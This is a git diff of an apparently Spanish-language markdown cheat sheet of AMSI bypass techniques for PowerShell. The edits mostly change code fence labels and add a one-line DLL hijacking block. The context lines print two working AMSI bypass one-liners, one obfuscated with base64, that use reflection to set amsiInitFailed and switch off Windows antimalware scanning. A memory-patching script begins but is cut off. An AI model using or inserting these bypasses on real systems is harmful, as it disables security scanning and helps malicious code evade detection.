@@ -25,7 +25,7 @@ Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomien
 <details><summary>Ver Script</summary>
 <p>
  
-```powershell
+```PowerShell
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
  </p>
@@ -36,7 +36,7 @@ Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomien
 <details><summary>Ver Script</summary>
 <p>
  
-```powershell
+```PowerShell
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' 
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
@@ -47,14 +47,16 @@ $field.SetValue($null,$true)
 
 ## DLL Hijacking ##
 
-
+````Batchfile
+C:>powershell.exe
+````
 
 ## Memory Patching ##
 
 <details><summary>Ver Script</summary>
 <p>
 
-```powershell
+```PowerShell
 $Win32 = @"
  
 using System;
